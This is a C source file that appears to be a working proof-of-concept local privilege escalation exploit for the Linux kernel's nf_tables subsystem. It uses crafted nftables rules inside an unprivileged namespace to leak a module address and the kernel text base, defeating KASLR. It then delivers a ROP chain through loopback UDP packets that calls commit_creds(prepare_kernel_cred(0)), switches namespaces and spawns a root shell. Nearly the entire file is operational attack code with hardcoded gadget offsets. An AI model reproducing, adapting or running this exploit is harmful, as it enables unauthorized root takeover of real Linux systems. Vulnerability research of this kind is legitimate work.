#define _GNU_SOURCE 1
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <stddef.h>	/* for offsetof */
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>

#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <libnftnl/set.h>
#include <sched.h>

#include <net/if.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <fcntl.h>
#include <limits.h>
#include "helpers.h"	

//gcc -I./libnftnl/include/ poc.c helpers.c -o poc  -lmnl -lnftnl
//scp -P 10021 -i ./bullseye.id_rsa  ./poc root@localhost:/home

#define pop_rdi_ret 0xadbe0 
#define pop_rsi_ret 0xa381e
#define prepare_kernel_cred 0xf21b0
#define commit_creds 0xf1ef0
#define mov_rdi_rax 0x02aacf
#define find_task_by_vpid 0xe8590 
#define init_nsproxy 0x208ffe0
#define switch_task_namespaces 0xf0950 
#define swapgs_restore_regs_and_return_to_usermode 0x10010f0 
#define cli_ret 0x28492
void spawnShell(){
	printf("[***] Exploit ran successfully \n");
	system("id");
	system("/bin/sh"); // we just spawn a shell
}

unsigned long user_cs, user_ss, user_sp, user_rflags;
void save_userland_registers(){
 __asm__(
		".intel_syntax noprefix;"
		"mov user_cs, cs;" // saves the cs register
		"mov user_ss, ss;" // saves the ss register
		"mov user_sp, rsp;" // saves the stack pointer
		"pushf;" // pushes the flags on the stack
		"pop user_rflags;" // pops the flags from the stack to user_rflags
		".att_syntax;"
 );
	puts("[*] Saved userland registers");
	printf("[#] cs: 0x%lx \n", user_cs);
	printf("[#] ss: 0x%lx \n", user_ss);
	printf("[#] rsp: 0x%lx \n", user_sp);
	printf("[#] rflags: 0x%lx \n\n", user_rflags);

}



uint64_t bigEndianToLittleEndian(uint64_t value) {
	uint64_t ret = 0;
	//11 22 33 44 55 66 77 88
	//64
	ret = (ret | ((value >> 56) & 0xFF));
	ret = (ret | (((value >> 48) & 0xFF) << 8));
	ret = (ret | (((value >> 40) & 0xFF) << 16));
	ret = (ret | (((value >> 32) & 0xFF) << 24));
	ret = (ret | (((value >> 24) & 0xFF) << 32));
	ret = (ret | (((value >> 16) & 0xFF) << 40));
	ret = (ret | (((value >>  8) & 0xFF) << 48));
	ret = (ret | ((value & 0xFF) << 56));
	ret = (((ret << 13) & 0xffffffffffffffff)  >> 16);
	return ret;
}

static int group = 9;
uint64_t module = 0;

static int data_cb(const struct nlmsghdr *nlh, void *data)
{
	//printf("received event type=%d from genetlink group %d message = %lx\n",
	//	nlh->nlmsg_type, group, *(unsigned long *)NLMSG_DATA(nlh));
    struct nlattr *attr;
    uint64_t rule_handle = 0;
    struct nlattr *attr_start = (struct nlattr *)mnl_nlmsg_get_payload(nlh);
    mnl_attr_for_each(attr, nlh, sizeof(*attr)) {
        if (mnl_attr_get_type(attr) == NFTA_TRACE_RULE_HANDLE) {
            // 获取属性中的数据
            rule_handle = mnl_attr_get_u64(attr);
            //printf("Received rule_handle: %lx\n", rule_handle);
            rule_handle = bigEndianToLittleEndian(rule_handle);
            //printf("Received rule_handle: %lx\n", rule_handle);
            if (rule_handle > 1)
            	module = rule_handle;
        }
    }
	return MNL_CB_OK;
}

int readfile(const char *filename, unsigned long *value)
{
	char buf[256];
	char *endptr;
	unsigned long num[100];
	int key[7];
	unsigned int i = 0;
	FILE *file = fopen(filename, "r");
	while(fgets(buf, sizeof(buf), file) != NULL) {
		num[i++] = strtoll(buf, &endptr, 16);		
	}
	unsigned int j = 0;
	for (i = 0; i < 14; i+=2)
	{
		key[j] = num[i];
		value[j++] = num[i+1];
	}
	
}

int getTextAddress(const char *filename, uint64_t *textbase)
{
	char buf[256];
	char *endptr;
	uint64_t data;
	FILE *file = fopen(filename, "r");
	while(fgets(buf, sizeof(buf), file) != NULL) {
		data = strtoll(buf, &endptr, 16);
		if (data != 0 && data != 0xffffffff)
			break;
	}
	if (data == 0)
		return 1;
	data = 0xffffffff00000000 | data;
	printf("data:0x%lx\n", data);
	*textbase = data - 0xc07375;
	return 0;
}

int main(int argc, char *argv[], char*envp[])
{	

    if (argc < 2) {
        puts("[+] Dropping into network namespace");
    
        char* new_argv[] = {
            "/usr/bin/unshare",
            "-Urn",
            argv[0],
            "EXPLOIT",
            NULL
        };

        execve(new_argv[0], new_argv, envp);
        puts("Couldn't start unshare wrapper..");
        puts("Recompile the exploit with an appropriate unshare path.");
        exit(EXIT_FAILURE);
    }
    
    system("ip link set dev lo up");
	char *table_name = "poc_table";
	char *chain_name = "poc_chain";	
	char *base_chain = "base_chain";
	char *set_name = "myset";	
	struct mnl_socket* nl = mnl_socket_open(NETLINK_NETFILTER);
	

	int seq = time(NULL);
	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0 ) {
		perror("[-] mnl_socket_bind");
		exit(EXIT_FAILURE);
	}
	
	/* ### (1) leak module ### */
	
	/* 1. create table */
	printf("[1] create table\n");	
	if (create_table(nl, table_name, NFPROTO_IPV4, &seq, NULL))
	{
		perror("[-] create table");
		exit(-1);
	}

	/* 2. create chain */
	printf("[2] create chain\n");	
	struct unft_base_chain_param bp;

	if (create_chain(nl, table_name, chain_name,  NFPROTO_IPV4, NULL, &seq, NULL))
	{
		perror("[-] create chain");
		exit(-1);
	}
	
	printf("[3] create set\n");	
	if(create_set(nl, table_name, set_name, NFPROTO_IPV4, &seq, NULL))
	{
		perror("[-] create set");
		exit(-1);		
	}
	


	printf("[4] create rule\n");	
	if (leak_rule(nl, table_name, chain_name, set_name, NFPROTO_IPV4, NULL, &seq))
	{
		perror("[-] create rule");
		exit(-1);		
	}
	
	bp.prio = 10;
	bp.hook_num = NF_INET_LOCAL_IN;	
	if (create_chain(nl, table_name, base_chain, NFPROTO_IPV4, &bp, &seq, NULL))
	{
		perror("[-] create base chain");
		exit(-1);		
	}
	
	if(jump_rule(nl, table_name, base_chain, NFPROTO_IPV4, NULL, &seq))
	{
		perror("[-] create jump rule");
		exit(-1);
	}
	
    #define SERVER_HOST "127.0.0.1"
    #define SERVER_PORT 9999
	setup_listener(SERVER_HOST, SERVER_PORT, NULL);
	
	#define CLIENT_HOST "127.0.0.1"
    #define CLIENT_PORT 8888
    
    struct sockaddr_in server;
    inet_aton(SERVER_HOST, &server.sin_addr);
    server.sin_port = htons(SERVER_PORT);
    server.sin_family = AF_INET;
    
    int client_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    struct sockaddr_in client_addr;
    inet_aton(CLIENT_HOST, &client_addr.sin_addr);
    client_addr.sin_port = htons(CLIENT_PORT);
    client_addr.sin_family = AF_INET;
    if (bind(client_sock, (struct sockaddr*)&client_addr, sizeof client_addr) < 0) {
        perror("client bind");
        return -1;
    }
      
    char msg[16] = {};
    char result[16] = {};
    *(uint64_t*)msg = MAGIC;  
    getchar();  
    if(sendto(client_sock, msg, sizeof msg, 0, (struct sockaddr*)&server, sizeof server) < 0)
    {
     	perror("[-] Error sending UDP packet");
        return 1;
    }
     
     system("nft list map poc_table myset | grep -Eo \"0x[0-9a-fA-F]+\" > out.txt");
     unsigned long value[7];
     readfile("./out.txt", value);
     //for (int i = 0; i < 7; i++)
     //	printf("%lx\n", value[i]);
     uint32_t chain_low = value[1] >> 16;
     uint32_t chain_high = value[2] >> 16;
     uint32_t rule_low = value[3] >> 16;
     uint32_t rule_high = value[4] >> 16;
     uint32_t last_rule_low = value[5] >> 16;
     uint32_t last_rule_high = value[6] >> 16;
     //printf("chain_low:%x\nchain_high:%x\nrule_low:%x\nrule_high:%x\nlast_rule_low:%x\nlast_rule_high:%x\n",chain_low, chain_high, rule_low, rule_high, last_rule_high, last_rule_low);    
     write_rule(nl, table_name, chain_name, NFPROTO_IPV4, NULL, &seq, &chain_low, &chain_high, &rule_low, &rule_high, &last_rule_low, &last_rule_high);

	
	
	struct mnl_socket* nleak = mnl_socket_open(NETLINK_NETFILTER);
	

	seq = time(NULL);
	if (mnl_socket_bind(nleak, 0, MNL_SOCKET_AUTOPID) < 0 ) {
		perror("[-] mnl_socket_bind");
		exit(EXIT_FAILURE);
	}
	
	if (mnl_socket_setsockopt(nleak, NETLINK_ADD_MEMBERSHIP, &group,
				  sizeof(int)) < 0) {
		perror("mnl_socket_setsockopt");
		exit(EXIT_FAILURE);
	}
	//getchar();
    if(sendto(client_sock, msg, sizeof msg, 0, (struct sockaddr*)&server, sizeof server) < 0)
    {
     	perror("[-] Error sending UDP packet");
        return 1;
    }
    sleep(2);

    char buf[256];
    int ret = mnl_socket_recvfrom(nleak, buf, sizeof(buf));
	while (ret > 0) {
		ret = mnl_cb_run(buf, ret, 0, 0, data_cb, NULL);
		if (ret <= 0)
			break;
		if (module > 0)
			break;
		ret = mnl_socket_recvfrom(nleak, buf, sizeof(buf));
	}
	if (ret == -1) {
		perror("error");
		exit(EXIT_FAILURE);
	}
	module = module - 0x25578c0;
	module = (0xffffff8000000000 | module);
	printf("module_base:0x%lx\n",module);

	//mnl_socket_close(nl);
	//mnl_socket_close(nleak);
	
	//sleep(2);
	
	if(delete_rule(nl, table_name, chain_name, NFPROTO_IPV4, &seq, NULL))
	{
		perror("[-] delete rule error");
		exit(EXIT_FAILURE);		
	}	

	if(delete_rule(nl, table_name, base_chain, NFPROTO_IPV4, &seq, NULL))
	{
		perror("[-] delete rule error");
		exit(EXIT_FAILURE);		
	}		
	
	if(delete_set(nl, table_name, set_name, NFPROTO_IPV4, &seq, NULL))
	{
		perror("[-] delete set error");
		exit(EXIT_FAILURE);		
	}
	
	if(delete_chain(nl, table_name, chain_name, NFPROTO_IPV4, &seq, NULL))
	{
		perror("[-] delete chain error");
		exit(EXIT_FAILURE);		
	}	

	if(delete_chain(nl, table_name, base_chain, NFPROTO_IPV4, &seq, NULL))
	{
		perror("[-] delete chain error");
		exit(EXIT_FAILURE);		
	}		

	if(delete_table(nl, table_name, NFPROTO_IPV4, &seq, NULL))
	{
		perror("[-] delete chain error");
		exit(EXIT_FAILURE);		
	}	
	
		
	/* #### (2) leak  text ###*/	
	table_name = "kaslr";
	set_name = "leak-set";
	chain_name = "leak-chain";
	char * aslr_set_name = "kaslr-set";
	
	if (create_table(nl, table_name, NFPROTO_IPV4, &seq, NULL))
	{
		perror("[-] create table");
		exit(-1);
	}
	
	if(create_set(nl, table_name, set_name, NFPROTO_IPV4, &seq, NULL))
	{
		perror("[-] create set");
		exit(-1);		
	}	
	
	if(create_set(nl, table_name, aslr_set_name, NFPROTO_IPV4, &seq, NULL))
	{
		perror("[-] create set");
		exit(-1);		
	}		
	
	if (create_chain(nl, table_name, chain_name,  NFPROTO_IPV4, NULL, &seq, NULL))
	{
		perror("[-] create chain");
		exit(-1);
	}
	
	if (leak_rule(nl, table_name, chain_name, set_name, NFPROTO_IPV4, NULL, &seq))
	{
		perror("[-] create rule");
		exit(-1);		
	}	

	bp.prio = 10;
	bp.hook_num = NF_INET_LOCAL_IN;	
	if (create_chain(nl, table_name, base_chain, NFPROTO_IPV4, &bp, &seq, NULL))
	{
		perror("[-] create base chain");
		exit(-1);		
	}

	if(leak_kaslr(nl, table_name, base_chain, aslr_set_name, NFPROTO_IPV4, NULL, &seq))
	{
		perror("[-] leak_kaslr");
		exit(-1);		
	}
	
	if(jump_rule_kaslr(nl, table_name, base_chain, NFPROTO_IPV4, NULL, &seq, &module))
	{
		perror("[-] create jump kaslr-rule");
		exit(-1);
	}
	
	
	
	if(sendto(client_sock, msg, sizeof msg, 0, (struct sockaddr*)&server, sizeof server) < 0)
    {
     	perror("[-] Error sending UDP packet");
        return 1;
    }
    
    system("nft list map kaslr leak-set | grep -Eo \"0x[0-9a-fA-F]+\" > kaslr.txt");
    readfile("./kaslr.txt", value);
    chain_low = value[1] >> 16;
    chain_high = value[2] >> 16;
    rule_low = value[3] >> 16;
    rule_high = value[4] >> 16;
    last_rule_low = value[5] >> 16;
    last_rule_high = value[6] >> 16;
    //printf("chain_low:%x\nchain_high:%x\nrule_low:%x\nrule_high:%x\nlast_rule_low:%x\nlast_rule_high:%x\n",chain_low, chain_high, rule_low, rule_high, last_rule_high, last_rule_low); 
     
	if(delete_rule(nl, table_name, chain_name, NFPROTO_IPV4, &seq, NULL))
	{
		perror("[-] delete rule error");
		exit(EXIT_FAILURE);		
	}	
	
	if(delete_set(nl, table_name, set_name, NFPROTO_IPV4, &seq, NULL))
	{
		perror("[-] delete set error");
		exit(EXIT_FAILURE);		
	}	
	
    if(write_rule_kaslr(nl, table_name, chain_name, NFPROTO_IPV4, NULL, &seq, &chain_low, &chain_high, &rule_low, &rule_high, &last_rule_low, &last_rule_high))
    {
		perror("[-] write_rule_kaslr");
		exit(EXIT_FAILURE);	    	
    }
    	
	getchar();
	
    if(sendto(client_sock, msg, sizeof msg, 0, (struct sockaddr*)&server, sizeof server) < 0)
    {
     	perror("[-] Error sending UDP packet");
        return 1;
    }  
    
    system("nft list map kaslr kaslr-set | grep -Eo \"0x[0-9a-fA-F]+\" > textbase.txt");
	uint64_t textbase;
	if(getTextAddress("./textbase.txt", &textbase))
	{
		perror("[-] getTextAddress");
		exit(EXIT_FAILURE);			
	}
	printf("textbase:0x%lx\n", textbase);
	
	//clear
	delete_rule(nl, table_name, chain_name, NFPROTO_IPV4, &seq, NULL);
	delete_rule(nl, table_name, base_chain, NFPROTO_IPV4, &seq, NULL);
	delete_set(nl, table_name, set_name, NFPROTO_IPV4, &seq, NULL);
	delete_chain(nl, table_name, base_chain, NFPROTO_IPV4, &seq, NULL);
	delete_chain(nl, table_name, chain_name, NFPROTO_IPV4, &seq, NULL);
	delete_table(nl, table_name, NFPROTO_IPV4, &seq, NULL);	
	
	
	/* #### (3) lpe ###*/
	table_name = "lpe";
	set_name = "lpe-set";
	chain_name = "lpe-chain";

	if (create_table(nl, table_name, NFPROTO_IPV4, &seq, NULL))
	{
		perror("[-] create table");
		exit(-1);
	}
	
	if(create_set(nl, table_name, set_name, NFPROTO_IPV4, &seq, NULL))
	{
		perror("[-] create set");
		exit(-1);		
	}		
	
	if (create_chain(nl, table_name, chain_name,  NFPROTO_IPV4, NULL, &seq, NULL))
	{
		perror("[-] create chain");
		exit(-1);
	}

	if (leak_rule(nl, table_name, chain_name, set_name, NFPROTO_IPV4, NULL, &seq))
	{
		perror("[-] create rule");
		exit(-1);		
	}

	bp.prio = 10;
	bp.hook_num = NF_INET_LOCAL_IN;	
	if (create_chain(nl, table_name, base_chain, NFPROTO_IPV4, &bp, &seq, NULL))
	{
		perror("[-] create base chain");
		exit(-1);		
	}	
	
	if(jump_rule_lpe(nl, table_name, base_chain, NFPROTO_IPV4, NULL, &seq, &module))
	{
		perror("[-] create jump kaslr-rule");
		exit(-1);
	}	

	//getchar();
	
    if(sendto(client_sock, msg, sizeof msg, 0, (struct sockaddr*)&server, sizeof server) < 0)
    {
     	perror("[-] Error sending UDP packet");
        return 1;
    }  
    
    system("nft list map lpe lpe-set | grep -Eo \"0x[0-9a-fA-F]+\" > lpe.txt");
    readfile("./lpe.txt", value);
    chain_low = value[1] >> 16;
    chain_high = value[2] >> 16;
    rule_low = value[3] >> 16;
    rule_high = value[4] >> 16;
    last_rule_low = value[5] >> 16;
    last_rule_high = value[6] >> 16;
    //printf("chain_low:%x\nchain_high:%x\nrule_low:%x\nrule_high:%x\nlast_rule_low:%x\nlast_rule_high:%x\n",chain_low, chain_high, rule_low, rule_high, last_rule_high, last_rule_low); 
    if(write_rule_kaslr(nl, table_name, chain_name, NFPROTO_IPV4, NULL, &seq, &chain_low, &chain_high, &rule_low, &rule_high, &last_rule_low, &last_rule_high))
    {
		perror("[-] write_rule_kaslr");
		exit(EXIT_FAILURE);	    	
    }   
    pid_t process_id = getpid();
    save_userland_registers();
    unsigned int offset = 0;
    unsigned long payload[31];
    payload[offset++] = textbase + cli_ret; 
    payload[offset++] = textbase + pop_rdi_ret;
    payload[offset++] = 0;
    payload[offset++] = textbase + prepare_kernel_cred;
    payload[offset++] = textbase + mov_rdi_rax;
    payload[offset++] = 0;
    payload[offset++] = textbase + commit_creds;
    payload[offset++] = textbase + pop_rdi_ret;
    payload[offset++] = process_id;
    payload[offset++] = textbase + find_task_by_vpid;
    payload[offset++] = textbase + mov_rdi_rax;
    payload[offset++] = 0;
    payload[offset++] = textbase + pop_rsi_ret;
    payload[offset++] = textbase + init_nsproxy;
    payload[offset++] = textbase + switch_task_namespaces;
    payload[offset++] = textbase + swapgs_restore_regs_and_return_to_usermode + 54;
    payload[offset++] = 0;
    payload[offset++] = 0;
	payload[offset++] = (unsigned long )spawnShell;
	payload[offset++] = user_cs;
	payload[offset++] = user_rflags;
	payload[offset++] = user_sp;
	payload[offset++] = user_ss;    
    
    if(sendto(client_sock, (char *)payload, offset * sizeof(unsigned long), 0, (struct sockaddr*)&server, sizeof server) < 0)
    {
     	perror("[-] Error sending UDP packet");
        return 1;
    } 
    
    

}



